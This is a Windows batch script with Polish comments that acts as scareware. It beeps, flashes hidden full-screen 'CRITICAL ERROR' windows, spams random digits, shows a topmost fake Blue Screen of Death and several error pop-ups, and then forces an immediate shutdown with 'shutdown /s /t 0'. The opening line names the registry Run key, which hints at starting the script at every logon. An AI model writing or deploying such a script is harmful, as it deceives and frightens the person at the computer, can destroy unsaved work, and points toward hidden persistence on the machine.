HKCU\Software\Microsoft\Windows\CurrentVersion\Run
@echo off
setlocal EnableDelayedExpansion
title SYSTEM FAILURE
color 0a
mode con cols=120 lines=40

:: =========================
:: START ALARM
:: =========================
powershell -c "[console]::beep(900,300);[console]::beep(500,500)"

:: =========================
:: LOOP PANIC – SAMOZAMYKAJĄCE OKNA
:: =========================
for /L %%i in (1,1,8) do (
  start powershell -WindowStyle Hidden -c ^
  "Add-Type -AssemblyName PresentationFramework;
   $w = New-Object System.Windows.Window;
   $w.WindowStyle='None';
   $w.WindowState='Maximized';
   $w.Background='Black';
   $t = New-Object System.Windows.Controls.TextBlock;
   $t.Text='CRITICAL ERROR 0x0%%i`nMEMORY CORRUPTION DETECTED';
   $t.Foreground='Red';
   $t.FontSize=48;
   $t.HorizontalAlignment='Center';
   $t.VerticalAlignment='Center';
   $w.Content=$t;
   $w.Show();
   Start-Sleep -Milliseconds 700;
   $w.Close();"
)

:: =========================
:: GLITCH AUDIO LOOP
:: =========================
powershell -c "1..10 | %% { [console]::beep((Get-Random -Min 200 -Max 1200),80) }"

:: =========================
:: MATRIX / ERROR SPAM
:: =========================
cls
color 0a
for /L %%i in (1,1,40) do (
  set "line="
  for /L %%j in (1,1,70) do (
    set /a r=!random! %% 10
    set "line=!line!!r!"
  )
  echo !line!
)

:: =========================
:: FAKE BSOD – PEŁNY EKRAN
:: =========================
powershell -WindowStyle Hidden -c ^
"Add-Type -AssemblyName PresentationFramework;
Add-Type -AssemblyName System.Windows.Forms;
$form = New-Object System.Windows.Forms.Form;
$form.BackColor = 'Blue';
$form.WindowState = 'Maximized';
$form.FormBorderStyle = 'None';
$form.TopMost = $true;

$label = New-Object System.Windows.Forms.Label;
$label.ForeColor = 'White';
$label.Font = New-Object System.Drawing.Font('Consolas',24);
$label.Text = ':(`n`nYour PC ran into a problem and needs to restart.`nWe''re just collecting some error info...`n`nSTOP CODE: CRITICAL_PROCESS_DIED';
$label.AutoSize = $true;
$label.Location = New-Object System.Drawing.Point(100,100);

$form.Controls.Add($label);
$form.Show();

1..15 | %% {
  [console]::beep(300,120);
  Start-Sleep -Seconds 1
}

$form.Close();"

:: =========================
:: KOŃCOWY PANIC LOOP
:: =========================
for /L %%i in (1,1,5) do (
  start powershell -c "Add-Type -AssemblyName PresentationFramework;[System.Windows.MessageBox]::Show('SYSTEM FAILURE','ERROR','OK','Error')"
  timeout /t 1 >nul
)

:: =========================
:: OPCJONALNY SHUTDOWN
:: =========================
echo.
echo SYSTEM WILL SHUT DOWN IN 20 SECONDS
echo CANCEL: shutdown /a
ping localhost -n 20 >nul

shutdown /s /t 0
